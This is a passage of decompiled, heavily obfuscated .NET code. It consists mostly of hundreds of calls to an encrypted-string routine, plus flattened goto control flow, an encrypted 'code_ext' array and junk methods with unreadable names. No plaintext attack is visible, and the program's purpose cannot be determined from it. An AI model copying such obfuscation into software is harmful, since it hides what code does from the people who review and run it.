						S7EI44sMaZQ92MiG6X.pA2PN5iOW(436),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(440),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(444),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(448),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(452),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(456),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(460),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(464),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(468),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(472),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(476),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(480),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(484),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(488),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(492),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(496),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(500),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(504),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(508),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(512),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(516),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(520),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(524),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(528),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(532),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(536),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(540),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(544),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(548),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(552),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(556),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(560),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(564),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(568),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(572),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(576),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(580),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(584),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(588),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(592),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(596),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(600),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(604),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(608),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(612),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(616),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(620),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(624),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(628),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(632),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(636),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(640),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(644),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(648),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(652),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(656),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(660),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(664),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(668),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(672),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(676),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(680),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(684),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(688),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(692),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(696),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(700),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(704),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(708),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(712),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(716),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(720),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(724),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(728),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(732),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(736),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(740),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(744),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(748),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(752),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(756),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(760),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(764),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(768),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(772),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(776),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(780),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(784),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(788),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(792),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(796),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(800),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(804),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(808),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(812),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(816),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(820),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(824),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(828),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(832),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(836),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(840),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(844),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(848),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(852),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(856),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(860),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(864),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(868),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(872),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(876),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(880),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(884),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(888),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(892),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(896),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(900),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(904),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(908),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(912),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(916),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(920),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(924),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(928),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(932),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(936),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(940),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(944),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(948),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(952),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(956),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(960),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(964),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(968),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(972),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(976),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(980),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(984),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(988),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(992),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(996),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1000),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1004),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1008),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1012),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1016),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1020),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1024),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1028),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1032),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1036),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1040),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1044),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1048),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1052),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1056),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1060),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1064),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1068),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1072),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1076),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1080),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1084),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1088),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1092),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1096),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1100),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1104),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1108),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1112),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1116),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1120),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1124),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1128),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1132),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1136),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1140),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1144),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1148),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1152),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1156),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1160),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1164),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1168),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1172),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1176),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1180),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1184),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1188),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1192),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1196),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1200),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1204),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1208),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1212),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1216),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1220),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1224),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1228),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1232),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1236),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1240),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1244),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1248),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1252),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1256),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1260),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1264),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1268),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1272),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1276),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1280),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1284),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1288),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1292),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1296),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1300),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1304),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1308),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1312),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1316),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1320),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1324),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1328),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1332),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1336),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1340),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1344),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1348),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1352),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1356),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1360),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1364),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1368),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1372),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1376),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1380),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1384),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1388),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1392),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1396),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1400),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1164),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1404),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1408),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1412),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1416),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1420),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1424),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1428),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1432),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1436),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1440),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1444),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1448),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1452),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1456),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1460),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1464),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1468),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1472),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1476),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1480),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1484),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1488),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1492),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1496),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1500),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1504),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1508),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1512),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1516),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1520),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1524),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1528),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1532),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1536),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1540),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1544),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1548),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1552),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1556),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1560),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1564),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1568),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1572),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1576),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1580),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1584),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1588),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1592),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1596),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1176),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1600),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1184),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1604),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1608),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1612),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1616),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1620),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1624),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1628),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1632),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1636),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1640),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1644),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1648),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1652),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1656),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1660),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1664),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1668),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1672),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1676),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1680),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1684),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1688),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1692),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1696),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1700),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1704),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1708),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1712),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1716),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1720),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1724),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1728),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1732),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1736),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1740),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1744),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1748),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1752),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1756),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(420),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1760),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1764),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1768),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1772),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1776),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1780),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1784),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1404),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1788),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1792),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1796),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1800),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1804),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1808),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1812),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1816),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1820),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1824),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1828),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1832),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1836),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1840),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1844),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1848),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1852),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1856),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1860),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1864),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1868),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1872),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1876),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1880),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1884),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1888),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1892),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(948),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1892),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1896),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1900),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1904),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1908),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1912),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1916),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1920),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1924),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1928),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1932),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1936),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1940),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(1944)
					};
					goto case 2;
				}
				num = 3;
				break;
			case 9:
				return;
				IL_199b:
				num = num3;
				break;
			}
			break;
			IL_18ad:
			code_ext = new string[9]
			{
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1508),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1984),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1556),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(972),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1988),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1504),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1328),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1296),
				S7EI44sMaZQ92MiG6X.pA2PN5iOW(1336)
			};
			num2 = 9;
		}
		goto IL_199f;
		IL_199f:
		num2 = num;
		goto IL_19a3;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
